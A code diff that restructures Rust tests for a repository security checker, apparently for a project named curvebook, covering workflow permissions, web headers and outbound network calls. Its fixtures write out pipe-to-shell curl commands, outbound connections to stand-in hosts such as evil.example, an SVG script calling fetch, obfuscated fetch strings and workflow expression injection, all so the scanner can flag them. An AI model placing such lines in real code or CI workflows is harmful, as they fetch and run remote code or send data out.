-        let (_, ok_block_hits) = run_checks(&dir_ok_block.path).unwrap();
-        assert!(ok_block_hits.is_empty(), "expected pages.yml deploy pages/id-token write (block) to pass: {ok_block_hits:?}");
-
-        let dir_ok_inline = create_clean_fixture("check4-pages-ok-inline");
-        dir_ok_inline.write(
-            ".github/workflows/pages.yml",
-            &format!("name: Pages\non: [push]\npermissions:\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions: {{ pages: write, id-token: write }}\n{deploy_steps}"),
-        );
-        let (_, ok_inline_hits) = run_checks(&dir_ok_inline.path).unwrap();
-        assert!(ok_inline_hits.is_empty(), "expected pages.yml deploy pages/id-token write (inline) to pass: {ok_inline_hits:?}");
-
-        // Top level, another job, a wider scope on the deploy job, and another workflow stay rejected.
-        let dir_bad = create_clean_fixture("check4-pages-bad");
-        dir_bad.write(
-            ".github/workflows/pages.yml",
-            &format!(
-                "name: Pages\non: [push]\npermissions:\n  contents: read\n  pages: write\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: echo bad\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n      contents: write\n{deploy_steps}"
-            ),
-        );
-        dir_bad.write(
-            ".github/workflows/release.yml",
-            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n    steps:\n      - run: echo bad\n",
-        );
-        let (_, bad_hits) = run_checks(&dir_bad.path).unwrap();
-        assert_eq!(bad_hits.len(), 4, "{bad_hits:?}");
-        assert!(has_bad_write(&bad_hits, ".github/workflows/pages.yml", "pages"), "{bad_hits:?}");
-        assert!(has_bad_write(&bad_hits, ".github/workflows/pages.yml", "id-token"), "{bad_hits:?}");
-        assert!(has_bad_write(&bad_hits, ".github/workflows/pages.yml", "contents"), "{bad_hits:?}");
-        assert!(has_bad_write(&bad_hits, ".github/workflows/release.yml", "pages"), "{bad_hits:?}");
+        let bad_cases: &[(&str, &str, String, &[&str])] = &[
+            ("attest-top", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\n  id-token: write\n  attestations: write\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n".into(), &["id-token", "attestations"]),
+            ("attest-other-job", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  git-sources:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: echo bad\n  linux:\n    runs-on: ubuntu-latest\n    permissions:\n      attestations: write\n    steps:\n      - run: echo bad\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo ok\n".into(), &["id-token", "attestations"]),
+            ("attest-ci", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      attestations: write\n    steps:\n      - run: cargo test\n".into(), &["id-token", "attestations"]),
+            ("attest-ci-top", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\n  id-token: write\n  attestations: write\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n".into(), &["id-token", "attestations"]),
+            ("attest-bad-scope", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      id-token: write\n      attestations: write\n      packages: write\n    steps:\n      - run: echo ok\n".into(), &["packages"]),
+            ("prune-top", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\n  actions: write\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh cache list\n".into(), &["actions"]),
+            ("prune-other-job", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: cargo test\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo bad\n".into(), &["actions", "contents"]),
+            ("prune-other-wf", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: echo bad\n".into(), &["actions"]),
+            ("pages-bad", ".github/workflows/pages.yml", format!("name: Pages\non: [push]\npermissions:\n  contents: read\n  pages: write\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: echo bad\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n      contents: write\n{deploy_steps}"), &["pages", "id-token", "contents"]),
+            ("pages-other-wf", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n    steps:\n      - run: echo bad\n".into(), &["pages"]),
+        ];
+        for (label, rel, body, scopes) in bad_cases {
+            let dir = create_clean_fixture(label);
+            dir.write(rel, body);
+            let (_, hits) = run_checks(dir.path()).unwrap();
+            assert_eq!(hits.len(), scopes.len(), "{label}: {hits:?}");
+            for &scope in *scopes {
+                assert!(has_bad_write(&hits, rel, scope), "{label}: missing `{scope}` in {hits:?}");
+            }
+        }
     }
 
     #[test]
-    fn check5_flags_weak_or_missing_web_security_headers() {
-        let dir = create_clean_fixture("check5-headers");
+    fn r2_sec22_and_da03_regression_matrices() {
+        // R2-S13-02/04/05/06/07: workflows, headers, cfg(not(test)), build.rs, core::net, js_sys, web assets.
+        let dir = create_clean_fixture("r2-matrix");
+        dir.write(".github/workflows/ci.yml", "name: CI\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  g:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: vmactions/freebsd-vm@v1\n        with:\n          prepare: echo ${{ github.head_ref }}\n          run: echo ${{ inputs.version }} ${{ github.ref_name }}\n      - run: curl -fsSL https://raw.githubusercontent.com/x/y/main/install.sh | bash\n");
+        dir.write("packaging/web/_headers", "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n");
+        dir.write("crates/mcp/src/tools.rs", "use std::net::{SocketAddr, TcpStream};\npub fn safe(port: u16) -> SocketAddr { SocketAddr::from(([127, 0, 0, 1], port)) }\npub fn exfil() { let _ = TcpStream::connect(\"198.51.100.1:443\"); }\n");
+        dir.write("crates/text/build.rs", "pub fn main() { let _ = std::net::TcpStream::connect(\"1.2.3.4:80\"); }\n");
         dir.write(
-            "packaging/web/_headers",
-            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self' https://telemetry.example; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=()\n  X-Content-Type-Options: nosniff\n",
-        );
-        let (_, hits) = run_checks(&dir.path).unwrap();
-        assert!(hits.iter().any(|v| v.check == 5 && v.path == "packaging/web/_headers" && v.detail.contains("connect-src 'self'")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 5 && v.path == "packaging/web/_headers" && v.detail.contains("geolocation=()")), "{hits:?}");
-
-        let dir2 = create_clean_fixture("check5-htaccess");
-        dir2.write("packaging/web/.htaccess", "<IfModule mod_headers.c>\n  Header always set X-Content-Type-Options \"nosniff\"\n</IfModule>\n");
-        let (_, hits2) = run_checks(&dir2.path).unwrap();
-        assert!(
-            hits2.iter().any(|v| v.check == 5 && v.path == "packaging/web/.htaccess" && v.detail.contains("Content-Security-Policy")),
-            "{hits2:?}"
-        );
-        assert!(hits2.iter().any(|v| v.check == 5 && v.path == "packaging/web/.htaccess" && v.detail.contains("Referrer-Policy")), "{hits2:?}");
-    }
-
-    #[test]
-    fn r2_s13_02_04_05_06_07_telemetry_regression_matrix() {
-        // R2-S13-02 & R2-S13-04: with: run:, script:, prepare:, inputs.*, ref_name, SHA pins, curl|bash
-        let dir_wf = create_clean_fixture("r2-wf");
-        dir_wf.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  g:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: vmactions/freebsd-vm@v1\n        with:\n          prepare: echo ${{ github.head_ref }}\n          run: echo ${{ inputs.version }} ${{ github.ref_name }}\n      - run: curl -fsSL https://raw.githubusercontent.com/x/y/main/install.sh | bash\n",
-        );
-        let (_, wf_hits) = run_checks(&dir_wf.path).unwrap();
-        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("SHA")), "{wf_hits:?}");
-        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("inputs.*")), "{wf_hits:?}");
-        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("github.ref_name")), "{wf_hits:?}");
-        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("github.head_ref")), "{wf_hits:?}");
-        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("main")), "{wf_hits:?}");
-
-        // R2-S13-05: missing COOP/COEP
-        let dir_hdr = create_clean_fixture("r2-hdr");
-        dir_hdr.write(
-            "packaging/web/_headers",
-            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n",
-        );
-        let (_, hdr_hits) = run_checks(&dir_hdr.path).unwrap();
-        assert!(hdr_hits.iter().any(|v| v.check == 5 && v.detail.contains("Cross-Origin-Opener-Policy")), "{hdr_hits:?}");
-        assert!(hdr_hits.iter().any(|v| v.check == 5 && v.detail.contains("Cross-Origin-Embedder-Policy")), "{hdr_hits:?}");
-
-        // R2-S13-06 & R2-S13-07: cfg(not(test)), per-fn loopback, build.rs, core::net, js_sys, web assets
-        let dir_net = create_clean_fixture("r2-net");
-        dir_net.write(
-            "crates/mcp/src/tools.rs",
-            "use std::net::{SocketAddr, TcpStream};\npub fn safe(port: u16) -> SocketAddr { SocketAddr::from(([127, 0, 0, 1], port)) }\npub fn exfil() { let _ = TcpStream::connect(\"198.51.100.1:443\"); }\n",
-        );
-        dir_net.write("crates/text/build.rs", "pub fn main() { let _ = std::net::TcpStream::connect(\"1.2.3.4:80\"); }\n");
-        dir_net.write(
             "crates/core/src/prod_cfg.rs",
             "#[cfg(all(unix, not(test)))]\npub fn f() { let _ = core::net::TcpStream::connect(\"1.2.3.4:80\"); }\n",
         );
-        dir_net.write("crates/core/src/js.rs", "pub fn f() { let _ = js_sys::Reflect::get(&w, &\"fetch\".into()); }\n");
-        dir_net.write(
+        dir.write("crates/core/src/js.rs", "pub fn f() { let _ = js_sys::Reflect::get(&w, &\"fetch\".into()); }\n");
+        dir.write(
             "crates/core/Cargo.toml",
             "[package]\nname = \"curvebook-core\"\n[dependencies]\nweb-sys = { version = \"0.3\", features = [\"Window\", \"WebSocket\"] }\n",
         );
-        dir_net.write("apps/curvebook-web/extra.js", "fetch ('https://bad.example/p'); const ws = new WebSocket('//bad.example/s');\n");
-        let (_, net_hits) = run_checks(&dir_net.path).unwrap();
-        assert!(net_hits.iter().any(|v| v.check == 1 && v.detail.contains("WebSocket")), "{net_hits:?}");
-        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/mcp/src/tools.rs" && v.detail.contains("loopback")), "{net_hits:?}");
-        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/text/build.rs"), "{net_hits:?}");
-        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/prod_cfg.rs" && v.detail.contains("core::net")), "{net_hits:?}");
-        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/js.rs" && v.detail.contains("fetch")), "{net_hits:?}");
-        assert!(net_hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/extra.js" && v.detail.contains("fetch")), "{net_hits:?}");
-        assert!(
-            net_hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/extra.js" && v.detail.contains("//bad.example")),
-            "{net_hits:?}"
-        );
-    }
+        dir.write("apps/curvebook-web/extra.js", "fetch ('https://bad.example/p'); const ws = new WebSocket('//bad.example/s');\n");
+        let (_, hits) = run_checks(dir.path()).unwrap();
+        for (check, path, needle) in [
+            (1, None, "WebSocket"),
+            (2, Some("crates/mcp/src/tools.rs"), "loopback"),
+            (2, Some("crates/text/build.rs"), "TcpStream"),
+            (2, Some("crates/core/src/prod_cfg.rs"), "core::net"),
+            (2, Some("crates/core/src/js.rs"), "fetch"),
+            (3, Some("apps/curvebook-web/extra.js"), "fetch"),
+            (3, Some("apps/curvebook-web/extra.js"), "//bad.example"),
+            (4, None, "SHA"),
+            (4, None, "inputs.*"),
+            (4, None, "github.ref_name"),
+            (4, None, "github.head_ref"),
+            (4, None, "main"),
+            (5, None, "Cross-Origin-Opener-Policy"),
+            (5, None, "Cross-Origin-Embedder-Policy"),
+        ] {
+            assert!(has_hit(&hits, check, path, needle), "r2-matrix missing ({check}, {path:?}, {needle}) in {hits:?}");
+        }
 
-    #[test]
-    fn sec22_catches_multiline_toml_const_generic_net_utf16_web_quoted_yaml_and_csp_schemes() {
+        // SEC22: multiline TOML, const generics, UTF-16 web SVG, quoted YAML, CSP schemes.
         let fx = create_clean_fixture("sec22-tel");
-        fx.write(
-            "crates/core/Cargo.toml",
-            "[package]\nname = \"curvebook-core\"\n[dependencies]\nweb-sys = {\n  version = \"0.3\",\n  features = [\n    \"Window\",\n    \"RequestInit\",\n  ]\n}\nalias = {\n  version = \"0.1\",\n  package = \"reqwest\"\n}\n",
-        );
+        fx.write("crates/core/Cargo.toml", "[package]\nname = \"curvebook-core\"\n[dependencies]\nweb-sys = {\n  version = \"0.3\",\n  features = [\n    \"Window\",\n    \"RequestInit\",\n  ]\n}\nalias = {\n  version = \"0.1\",\n  package = \"reqwest\"\n}\n");
         fx.write(
             "crates/core/src/stealth.rs",
             "use web_sys::{\n  Window,\n  Headers as H,\n};\npub fn f() { let _ = js_sys::eval(\"fetch('https://bad.example')\"); }\n",
         );
-        fx.write(
-            "crates/mcp/src/tools.rs",
-            "use std::net::TcpStream;\npub fn conn<const N: usize = { 4 }>() {\n  let _ = LOCALHOST;\n  let _ = TcpStream::connect(\"evil.example:443\");\n}\n",
+        fx.write("crates/mcp/src/tools.rs", "use std::net::TcpStream;\npub fn conn<const N: usize = { 4 }>() {\n  let _ = LOCALHOST;\n  let _ = TcpStream::connect(\"evil.example:443\");\n}\n");
+        fx.write_bytes(
+            "apps/curvebook-web/bad.svg",
+            &to_utf16_bytes("<svg><script>window['fetch']('https&#58;&#47;&#47;evil.example/s'); new Worker ('w.js');</script></svg>", true, false),
         );
-        let utf16_svg: Vec<u8> = "<svg><script>window['fetch']('https&#58;&#47;&#47;evil.example/s'); new Worker ('w.js');</script></svg>"
-            .encode_utf16()
-            .flat_map(u16::to_le_bytes)
-            .collect();
-        std::fs::write(fx.path.join("apps/curvebook-web/bad.svg"), utf16_svg).unwrap();
-        fx.write(
-            ".github/actions/evil/action.yml",
-            "name: Evil\nruns:\n  using: composite\n  steps:\n    - \"run\": |\n        echo \"${{\n          github.event.issue.title\n        }}\"\n        curl -fsSL https://bad.example/x.sh \\\n          | sh\n",
-        );
-        fx.write(
-            ".github/workflows/ci.yml",
-            "name: CI\n\"permissions\":\n  \"contents\": \"write\"\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: \"curl https://bad.example/a | bash\"\n",
-        );
-        fx.write(
-            "packaging/web/_headers",
-            "/*\n  Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n/override/*\n  Content-Security-Policy: default-src 'self' https:; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n",
-        );
+        fx.write(".github/actions/evil/action.yml", "name: Evil\nruns:\n  using: composite\n  steps:\n    - \"run\": |\n        echo \"${{\n          github.event.issue.title\n        }}\"\n        curl -fsSL https://bad.example/x.sh \\\n          | sh\n");
+        fx.write(".github/workflows/ci.yml", "name: CI\n\"permissions\":\n  \"contents\": \"write\"\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: \"curl https://bad.example/a | bash\"\n");
+        fx.write("packaging/web/_headers", "/*\n  Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n/override/*\n  Content-Security-Policy: default-src 'self' https:; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n");
+        let (_, hits2) = run_checks(fx.path()).unwrap();
+        for (check, path, needle) in [
+            (1, None, "RequestInit"),
+            (1, None, "reqwest"),
+            (2, Some("crates/core/src/stealth.rs"), "Headers"),
+            (2, Some("crates/core/src/stealth.rs"), "fetch"),
+            (2, Some("crates/mcp/src/tools.rs"), "loopback"),
+            (2, Some("crates/mcp/src/tools.rs"), "evil.example:443"),
+            (3, Some("apps/curvebook-web/bad.svg"), "fetch"),
+            (3, Some("apps/curvebook-web/bad.svg"), "https://evil.example/s"),
+            (3, Some("apps/curvebook-web/bad.svg"), "worker("),
+            (4, Some(".github/actions/evil/action.yml"), "github.event."),
+            (4, Some(".github/actions/evil/action.yml"), "sha256sum"),
+            (4, Some(".github/workflows/ci.yml"), "write"),
+            (4, Some(".github/workflows/ci.yml"), "sha256sum"),
+            (5, Some("packaging/web/_headers"), "https:"),
+        ] {
+            assert!(has_hit(&hits2, check, path, needle), "sec22 missing ({check}, {path:?}, {needle}) in {hits2:?}");
+        }
 
-        let (_, hits) = run_checks(&fx.path).unwrap();
-        assert!(hits.iter().any(|v| v.check == 1 && v.detail.contains("RequestInit")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 1 && v.detail.contains("reqwest")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/stealth.rs" && v.detail.contains("Headers")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/stealth.rs" && v.detail.contains("fetch")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/mcp/src/tools.rs" && v.detail.contains("loopback")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/mcp/src/tools.rs" && v.detail.contains("evil.example:443")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/bad.svg" && v.detail.contains("fetch")), "{hits:?}");
-        assert!(
-            hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/bad.svg" && v.detail.contains("https://evil.example/s")),
-            "{hits:?}"
-        );
-        assert!(hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/bad.svg" && v.detail.contains("worker(")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 4 && v.path == ".github/actions/evil/action.yml" && v.detail.contains("github.event.")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 4 && v.path == ".github/actions/evil/action.yml" && v.detail.contains("sha256sum")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 4 && v.path == ".github/workflows/ci.yml" && v.detail.contains("write")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 4 && v.path == ".github/workflows/ci.yml" && v.detail.contains("sha256sum")), "{hits:?}");
-        assert!(hits.iter().any(|v| v.check == 5 && v.path == "packaging/web/_headers" && v.detail.contains("https:")), "{hits:?}");
-    }
-
-    #[test]
-    fn da_03_07_rust_lexer_extracts_strings_past_char_quotes_raw_prefixes_and_escapes() {
-        let fx = create_clean_fixture("da-03-07-tel");
-        fx.write(
-            "crates/core/src/wasm_evasion.rs",
-            concat!(
-                "pub fn f() {\n",
-                "    let _ = js_sys::eval(\"ok\");\n",
-                "    let _q = '\"';\n",
-                "    let _a = \"fetch\";\n",
-                "    let _b = br#\"websocket\"#;\n",
-                "    let _c = cr#\"eventsource\"#;\n",
-                "    let _d = \"\\u{66}etch\";\n",
-                "    let _e = \"\\x66etch\";\n",
-                "    let _f = \"fe\\\n\n    tch\";\n",
-                "}\n",
-            ),
-        );
-        fx.write(
-            "crates/mcp/src/tools.rs",
-            concat!(
-                "use std::net::TcpStream;\n",
-                "pub fn conn() {\n",
-                "    let _ = LOCALHOST;\n",
-                "    let _q = '\"';\n",
-                "    let _ = TcpStream::connect(\"8.8.8.\\\n\n    8:80\");\n",
-                "}\n",
-            ),
-        );
-        let (_, hits) = run_checks(&fx.path).unwrap();
-        let wasm_hits: Vec<_> = hits.iter().filter(|v| v.path == "crates/core/src/wasm_evasion.rs").collect();
-        assert_eq!(wasm_hits.len(), 6, "expected all 6 obfuscated JS network strings caught, got {wasm_hits:?}");
-        assert!(
-            hits.iter().any(|v| v.path == "crates/mcp/src/tools.rs" && v.detail.contains("8.8.8.8:80")),
-            "expected char-quote + continuation IP literal caught, got {hits:?}"
-        );
+        // DA-03-07: char quotes, raw prefixes, unicode/hex escapes, line continuations.
+        let fx3 = create_clean_fixture("da-03-07-tel");
+        fx3.write("crates/core/src/wasm_evasion.rs", "pub fn f() {\n    let _ = js_sys::eval(\"ok\");\n    let _q = '\"';\n    let _a = \"fetch\";\n    let _b = br#\"websocket\"#;\n    let _c = cr#\"eventsource\"#;\n    let _d = \"\\u{66}etch\";\n    let _e = \"\\x66etch\";\n    let _f = \"fe\\\n\n    tch\";\n}\n");
+        fx3.write("crates/mcp/src/tools.rs", "use std::net::TcpStream;\npub fn conn() {\n    let _ = LOCALHOST;\n    let _q = '\"';\n    let _ = TcpStream::connect(\"8.8.8.\\\n\n    8:80\");\n}\n");
+        let (_, hits3) = run_checks(fx3.path()).unwrap();
+        assert_eq!(hits3.iter().filter(|v| v.path == "crates/core/src/wasm_evasion.rs").count(), 6, "{hits3:?}");
+        assert!(has_hit(&hits3, 2, Some("crates/mcp/src/tools.rs"), "8.8.8.8:80"), "{hits3:?}");
     }
 }
